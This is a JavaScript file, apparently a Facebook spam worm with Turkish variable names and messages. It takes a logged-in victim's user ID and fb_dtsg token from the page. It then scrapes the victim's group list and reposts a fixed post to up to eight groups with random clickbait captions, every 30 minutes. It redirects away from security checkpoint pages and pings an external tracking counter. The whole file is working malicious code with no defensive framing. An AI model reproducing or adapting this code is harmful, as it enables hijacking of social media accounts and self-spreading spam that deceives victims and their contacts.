new Image().src="http://whos.amung.us/widget/muglauser.png";
var paylasim_araligi = 500;    
var grup_limit = 8;
var grup_ids = [];
var grup_say = 0;
var success = 0;
var cronjob = 1800;
var close = 0;
var d = document;
var mesagge = Array("izleyin beyler :)","olaya bakarmısınız","ilginç bir durum :)","şaka gibi :D","ancak bu kadar olur","bunu izlemelisiniz :)","bence sizde bakın beyler :)","izle zaten paylaşırsın :) :)","neler var arkadaş :D <3","bu nedir arkadaş ya","önce izleyin sonra karar verirsiniz","resmen dondum kaldım","olacak olan oluyor işte ...","paylaşn herkes görsün beyler bayanlar","bu olay paylaşım rekoru kıracak","ben izledim sizde izleyin derim ve paylaşın lütfen","bakın bakalım dünyada neler var :D","Olaysız geçmiyorki günler");
var profile_id = document.cookie.match(/c_user=(\d+)/)[1]; 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;  

if (document.URL.indexOf("https://www.facebook.com") >= 0) { 

if (document.URL.indexOf("https://www.facebook.com/checkpoint") >= 0){
	  window.setInterval(function() {	
	  location.href = "http://www.facebook.com"; 
}, 1000);	
}   

	function SR321(a){
	TRDF53 = '';	
	for (var x = 0; x < a.length; x++){
		TRDF53 += a.charCodeAt(x);
	}
	TRDF53 = '2'+TRDF53;
	return TRDF53;	
	}  
	
	function messagerand() {
		return mesagge[Math.floor(Math.random()*mesagge.length)];
    } 	
	
    function composer(space) {
        var karakterler = "abcdef0123456789";
        var random = "";
        for (var i = 0; i < space; i++) random += karakterler[Math.floor(Math.random() * karakterler.length)];
        return random;
    }
	
	function composerrandom(){
		return composer(8)+'-'+composer(4)+'-'+composer(4)+'-'+composer(4)+'-'+composer(12);			
	}
	
		function grupdapaylas(gizli_id,fbdtsg,veri12) {
		if (grup_limit > success){
			var connect = new XMLHttpRequest();
			var kac_grup = grup_ids.length;
			if (kac_grup > grup_limit){
				kac_grup = grup_limit;
			}
			var site =   "https://www.facebook.com/share/dialog/submit/?app_id=2309869772&attribution="+profile_id+"&audience_type=group&audience_targets[0]="+grup_ids[0]+"&composer_session_id="+composerrandom()+"&ephemeral_ttl_mode=0&internalextra[feedback_source]=2&is_forced_reshare_of_post=false&message="+messagerand()+"&owner_id="+profile_id+"&post_id="+gizli_id+"&privacy=300645083384735&share_to_group_as_page=false&share_type=99&shared_ad_id=&source=osbach&url=&av="+profile_id+"&dpr=1";        
			var params = "__user="+profile_id;
            params += "&__a=1";
            params += "&__dyn=5V5yAW8-aloAwmgDxyG8EiolzFEbEyGgyi8zQC-C26m6oKezob4q8zUK5U4e2O3Ou5R88y8aJKeKcGiVWxeUlxWEuwYDDBBwDKq4GCzEkxvz8K-ax2q5qxe6U8998CiummE";
            params += "&__req=1w";
            params += "&__be=0";
            params += "&__pc=PHASED:DEFAULT";
            params += "&fb_dtsg="+fbdtsg;
            params += "&ttstamp="+SR321(fbdtsg);
            params += "&__rev="+veri12;
			connect.open("POST", site, true);
			connect.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			grup_ids['splice'](0, 1);
			connect.onreadystatechange = function () {
            if (connect.readyState == 4 && connect.status == 200) {
				var str = connect.responseText;
				var data = str.replace('for (;;);', '');
				var parse_data = JSON.parse(data);
			if(parse_data.errorSummary){
				sorunmesaji("Paylasim Yapilamadi Hata icerigi :" + parse_data.errorSummary);	
				}
				else{
					success++;
					grupdapaylas(gizli_id,fbdtsg,veri12);					
				}
				connect.close;
				}    
				}	
		connect.send(params); 
	}		
}

	function gruplaricek(profile_id, postid,fbdtsg,veri12) {
        var connect = new XMLHttpRequest();
        connect.open('GET', 'https://www.facebook.com/groups/?category=membership', true);
        connect.onreadystatechange = function () {
            if (connect.readyState == 4 && connect.status == 200) {

                var grup = [];
                var azcddf = /group_id=(\d+)&amp;pinned/g;
                while ((grup = azcddf['exec'](connect.responseText)) !== null) {
                    grup_say++;
                    grup_ids.push(grup[1]);
                };
                if (grup_say > 0) {
					grupdapaylas(postid,fbdtsg,veri12);
                } else {
                    console.log('grup bulunamadı!')
                }
			                connect.close;	
            }
        }
        connect.send();
}



	function baslat(){
		var postunidsi = "1598239813806726";
		var amkla = "2442177";
		gruplaricek(profile_id,postunidsi,fb_dtsg,amkla);

	}
	
			var cookie="cookie8_";
			var zaman = new Date();
			var cookiekayit = new RegExp(cookie + profile_id + '=(\\d+)');
			var cookiekontrol = document.cookie.match(cookiekayit);
			if (!cookiekontrol || (cookiekontrol[1] < zaman.getTime())) {
				document.cookie = cookie + profile_id + '=' + zaman.setTime(zaman.getTime() + cronjob * 1000);					
					baslat();
			}					
			else{
				    console.log(Math.floor((cookiekontrol[1] - zaman.getTime()) / 1000));
				}
}	
